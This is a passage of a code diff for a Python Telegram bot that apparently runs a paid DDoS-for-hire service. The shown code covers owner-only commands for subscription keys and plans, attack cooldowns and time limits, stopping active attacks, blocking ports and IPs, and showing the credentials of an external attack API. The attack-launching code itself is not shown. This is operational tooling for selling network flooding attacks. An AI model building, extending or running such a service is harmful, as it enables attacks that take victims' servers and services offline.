+    with _attack_lock:
+        if str(user_id) in user_cooldowns:
+            del user_cooldowns[str(user_id)]
+    
+    bot.reply_to(message, f"{E['check']} Cooldown reset for user {user_id}.")
+
+# ----- GROUPS LIST -----
+@bot.message_handler(commands=['groups', 'approved_groups'])
+def list_groups(message):
+    if not is_owner(message.from_user.id):
+        return
+    
+    all_groups = groups_col.find()
+    text = f"{E['group']} <b>Approved Groups:</b>\n\n"
+    count = 0
+    
+    for group in all_groups:
+        limits = get_group_limits(group["_id"])
+        text += f"• ID: <code>{group['_id']}</code>\n"
+        text += f"  Concurrent: {limits[0]}, Max Time: {limits[1]}s, Cooldown: {limits[2]}s\n\n"
+        count += 1
+    
+    if count == 0:
+        text += "No approved groups."
+    
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- ADD ADMIN -----
+@bot.message_handler(commands=['addadmin'])
+def add_admin(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /addadmin <user_id>", parse_mode="HTML")
+        return
+    user_id = parts[1]
+    admins_col.insert_one({"_id": str(user_id)})
+    bot.reply_to(message, f"{E['check']} User {user_id} added as admin.")
+
+# ----- REMOVE ADMIN -----
+@bot.message_handler(commands=['removeadmin'])
+def remove_admin(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /removeadmin <user_id>", parse_mode="HTML")
+        return
+    user_id = parts[1]
+    admins_col.delete_one({"_id": str(user_id)})
+    bot.reply_to(message, f"{E['cross']} User {user_id} removed as admin.")
+
+# ----- ADMINS LIST -----
+@bot.message_handler(commands=['admins'])
+def list_admins(message):
+    if not is_owner(message.from_user.id):
+        return
+    all_admins = admins_col.find()
+    text = f"{E['crown']} <b>Admins:</b>\n\n"
+    for admin in all_admins:
+        text += f"• <code>{admin['_id']}</code>\n"
+    
+    if admins_col.count_documents({}) == 0:
+        text += "No admins."
+    
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- BANNED LIST -----
+@bot.message_handler(commands=['banned_list'])
+def banned_list(message):
+    if not is_owner(message.from_user.id):
+        return
+    all_banned = bans_col.find()
+    text = f"{E['lock']} <b>Banned Users:</b>\n\n"
+    for user in all_banned:
+        text += f"• <code>{user['_id']}</code>\n"
+    
+    if bans_col.count_documents({}) == 0:
+        text += "No banned users."
+    
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- REMOVE USER PLAN -----
+@bot.message_handler(commands=['remove'])
+def remove_user_plan(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /remove <user_id>", parse_mode="HTML")
+        return
+    user_id = parts[1]
+    plans_col.delete_one({"_id": str(user_id)})
+    bot.reply_to(message, f"{E['cross']} User {user_id} plan removed.")
+
+# ----- REMOVE EXPIRED -----
+@bot.message_handler(commands=['remove_expired'])
+def remove_expired(message):
+    if not is_owner(message.from_user.id):
+        return
+    all_plans = plans_col.find()
+    count = 0
+    for plan in all_plans:
+        expires = datetime.fromisoformat(plan["expires"])
+        if datetime.now() > expires:
+            plans_col.delete_one({"_id": plan["_id"]})
+            count += 1
+    bot.reply_to(message, f"{E['check']} Removed {count} expired plans.")
+
+# ----- EXTEND KEY -----
+@bot.message_handler(commands=['extendkey'])
+def extend_key(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, f"{E['warning']} Usage: /extendkey <key/id> <time>", parse_mode="HTML")
+        return
+    
+    key_id = parts[1].upper()
+    time_str = parts[2]
+    
+    time_delta = parse_time(time_str)
+    if not time_delta:
+        bot.reply_to(message, f"{E['cross']} Invalid time format!")
+        return
+    
+    # Check if it's a key
+    key = keys_col.find_one({"_id": key_id})
+    if key:
+        current_expires = datetime.fromisoformat(key["expires"])
+        new_expires = current_expires + time_delta
+        keys_col.update_one({"_id": key_id}, {"$set": {"expires": new_expires.isoformat()}})
+        bot.reply_to(message, f"{E['check']} Key {key_id} extended to {new_expires.strftime('%Y-%m-%d %H:%M:%S')}")
+        return
+    
+    # Check if it's a user
+    plan = plans_col.find_one({"_id": str(key_id)})
+    if plan:
+        current_expires = datetime.fromisoformat(plan["expires"])
+        new_expires = current_expires + time_delta
+        plans_col.update_one({"_id": str(key_id)}, {"$set": {"expires": new_expires.isoformat()}})
+        bot.reply_to(message, f"{E['check']} User {key_id} plan extended to {new_expires.strftime('%Y-%m-%d %H:%M:%S')}")
+        return
+    
+    bot.reply_to(message, f"{E['cross']} Key or user not found.")
+
+# ----- EXTEND ALL KEYS -----
+@bot.message_handler(commands=['extendallkey'])
+def extend_all_keys(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /extendallkey <time>", parse_mode="HTML")
+        return
+    
+    time_str = parts[1]
+    time_delta = parse_time(time_str)
+    if not time_delta:
+        bot.reply_to(message, f"{E['cross']} Invalid time format!")
+        return
+    
+    all_keys = keys_col.find()
+    count = 0
+    
+    for key in all_keys:
+        current_expires = datetime.fromisoformat(key["expires"])
+        new_expires = current_expires + time_delta
+        keys_col.update_one({"_id": key["_id"]}, {"$set": {"expires": new_expires.isoformat()}})
+        count += 1
+    
+    bot.reply_to(message, f"{E['check']} Extended {count} keys by {time_str}.")
+
+# ----- DOWN KEY -----
+@bot.message_handler(commands=['down'])
+def down_key(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, f"{E['warning']} Usage: /down <key/id> <time>", parse_mode="HTML")
+        return
+    
+    key_id = parts[1].upper()
+    time_str = parts[2]
+    
+    time_delta = parse_time(time_str)
+    if not time_delta:
+        bot.reply_to(message, f"{E['cross']} Invalid time format!")
+        return
+    
+    key = keys_col.find_one({"_id": key_id})
+    if key:
+        current_expires = datetime.fromisoformat(key["expires"])
+        new_expires = current_expires - time_delta
+        keys_col.update_one({"_id": key_id}, {"$set": {"expires": new_expires.isoformat()}})
+        bot.reply_to(message, f"{E['check']} Key {key_id} reduced to {new_expires.strftime('%Y-%m-%d %H:%M:%S')}")
+        return
+    
+    plan = plans_col.find_one({"_id": str(key_id)})
+    if plan:
+        current_expires = datetime.fromisoformat(plan["expires"])
+        new_expires = current_expires - time_delta
+        plans_col.update_one({"_id": str(key_id)}, {"$set": {"expires": new_expires.isoformat()}})
+        bot.reply_to(message, f"{E['check']} User {key_id} plan reduced to {new_expires.strftime('%Y-%m-%d %H:%M:%S')}")
+        return
+    
+    bot.reply_to(message, f"{E['cross']} Key or user not found.")
+
+# ----- KEY USERS -----
+@bot.message_handler(commands=['keyusers'])
+def key_users(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /keyusers <key>", parse_mode="HTML")
+        return
+    
+    code = parts[1].upper()
+    key = keys_col.find_one({"_id": code})
+    
+    if not key:
+        bot.reply_to(message, f"{E['cross']} Key not found.")
+        return
+    
+    redeemed_by = key.get("redeemed_by")
+    if not redeemed_by:
+        bot.reply_to(message, f"{E['info']} Key {code} has not been redeemed yet.")
+        return
+    
+    plan = plans_col.find_one({"_id": str(redeemed_by)})
+    if plan:
+        expires = datetime.fromisoformat(plan["expires"])
+        remaining = expires - datetime.now()
+        days = remaining.days
+        hours = remaining.seconds // 3600
+        
+        text = f"""{E['info']} <b>Key Users:</b>
+
+{E['key']} Code: {code}
+{E['user']} User ID: {redeemed_by}
+{E['calendar']} Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')}
+{E['calendar']} Time Left: {days}d {hours}h"""
+    else:
+        text = f"{E['info']} Key {code} redeemed by {redeemed_by}, but no active plan found."
+    
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- STOP ALL ATTACKS -----
+@bot.message_handler(commands=['stop'])
+def stop_all_attacks(message):
+    if not is_owner(message.from_user.id):
+        return
+    with _attack_lock:
+        active_attacks.clear()
+        user_cooldowns.clear()
+    bot.reply_to(message, f"{E['cross']} All attacks stopped.")
+
+# ----- MY API -----
+@bot.message_handler(commands=['myapi'])
+def my_api(message):
+    if not is_owner(message.from_user.id):
+        return
+    text = f"""{E['link']} <b>API Info:</b>
+
+{E['link']} URL: {get_setting('api_url', API_BASE_URL)}
+{E['key']} API Key: <code>{get_setting('api_key', API_KEY)}</code>
+{E['settings']} Method: {get_setting('attack_method', DEFAULT_METHOD)}"""
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- RESET USER ATTACK -----
+@bot.message_handler(commands=['resetuserattack'])
+def reset_user_attack(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, f"{E['warning']} Usage: /resetuserattack <user_id> <group_id>", parse_mode="HTML")
+        return
+    
+    user_id = parts[1]
+    chat_id = parts[2]
+    
+    with _attack_lock:
+        for attack_id, attack in list(active_attacks.items()):
+            if attack.get('user_id') == int(user_id) and attack.get('chat_id') == int(chat_id):
+                del active_attacks[attack_id]
+    
+    bot.reply_to(message, f"{E['check']} Reset attacks for user {user_id} in group {chat_id}.")
+
+# ----- OK (Maintenance OFF) -----
+@bot.message_handler(commands=['ok'])
+def maintenance_off(message):
+    if not is_owner(message.from_user.id):
+        return
+    update_setting("maintenance_mode", False)
+    bot.reply_to(message, f"{E['check']} Maintenance OFF.")
+
+# ----- BLOCK PORT -----
+@bot.message_handler(commands=['addport'])
+def add_port(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /addport <port>", parse_mode="HTML")
+        return
+    port = parts[1]
+    blocked_ports_col.insert_one({"_id": str(port)})
+    bot.reply_to(message, f"{E['lock']} Port {port} blocked.")
+
+# ----- UNBLOCK PORT -----
+@bot.message_handler(commands=['removeport'])
+def remove_port(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /removeport <port>", parse_mode="HTML")
+        return
+    port = parts[1]
+    blocked_ports_col.delete_one({"_id": str(port)})
+    bot.reply_to(message, f"{E['unlock']} Port {port} unblocked.")
+
+# ----- BLOCK IP -----
+@bot.message_handler(commands=['addip'])
+def add_ip(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /addip <ip>", parse_mode="HTML")
+        return
+    ip = parts[1]
+    blocked_ips_col.insert_one({"_id": ip})
+    bot.reply_to(message, f"{E['lock']} IP {ip} blocked.")
+
+# ----- UNBLOCK IP -----
+@bot.message_handler(commands=['removeip'])
+def remove_ip(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /removeip <ip>", parse_mode="HTML")
+        return
+    ip = parts[1]
+    blocked_ips_col.delete_one({"_id": ip})
+    bot.reply_to(message, f"{E['unlock']} IP {ip} unblocked.")
+
+# ----- SET GROUP CONFIG -----
+@bot.message_handler(commands=['setgrp'])
+def set_group_config(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 4:
+        bot.reply_to(message, f"{E['warning']} Usage: /setgrp <group_id> <setting> <value>", parse_mode="HTML")
+        return
+    
+    group_id = parts[1]
+    setting = parts[2].lower()
+    value = parts[3]
+    
+    config_map = {
+        "max_concurrent": "max_concurrent",
+        "max_time": "max_time",
+        "cooldown": "cooldown",
+        "per_person_limit": "per_person_limit"
+    }
+    
+    if setting not in config_map:
+        bot.reply_to(message, f"{E['cross']} Invalid setting! Available: max_concurrent, max_time, cooldown, per_person_limit")
+        return
+    
+    try:
+        val = int(value)
+        if val < 0:
+            bot.reply_to(message, f"{E['cross']} Value must be positive.")
+            return
+        
+        limits_col.update_one({"_id": str(group_id)}, {"$set": {config_map[setting]: val}}, upsert=True)
+        bot.reply_to(message, f"{E['check']} Group {group_id} {setting} set to {val}.")
+    except ValueError:
+        bot.reply_to(message, f"{E['cross']} Value must be a number.")
+
+# ----- SET GLOBAL COOLDOWN -----
+@bot.message_handler(commands=['setglobalcooldown'])
+def set_global_cooldown(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /setglobalcooldown <seconds>", parse_mode="HTML")
+        return
+    try:
+        c = int(parts[1])
+        if c < 0 or c > 600:
+            bot.reply_to(message, f"{E['cross']} Cooldown must be 0-600s!")
+            return
+        update_setting("global_cooldown", c)
+        update_setting("cooldown", c)
+        plans_col.update_many({}, {"$set": {"cooldown": c}})
+        bot.reply_to(message, f"{E['check']} Global cooldown set to {c}s.")
+    except:
+        bot.reply_to(message, f"{E['cross']} Invalid number!")
+
+# ================= START BOT =================
+print(f"{E['fire']} OGGY BHAI BOT STARTING... {E['sparkles']}")
+print(f"{E['crown']} Owner: {BOT_OWNER}")
+print(f"{E['link']} API: {get_setting('api_url', API_BASE_URL)}")
+print(f"{E['settings']} Method: {get_setting('attack_method', DEFAULT_METHOD)}")
+print(f"{E['zap']} Max Concurrent: {get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}")
+print(f"{E['clock']} Max Time: {get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s")
+print(f"{E['video']} Video URLs loaded: {len(VIDEO_URLS)}")
+
+while True:
+    try:
+        bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
+    except Exception as e:
+        print(f"Polling error: {e}")
+        time.sleep(5)
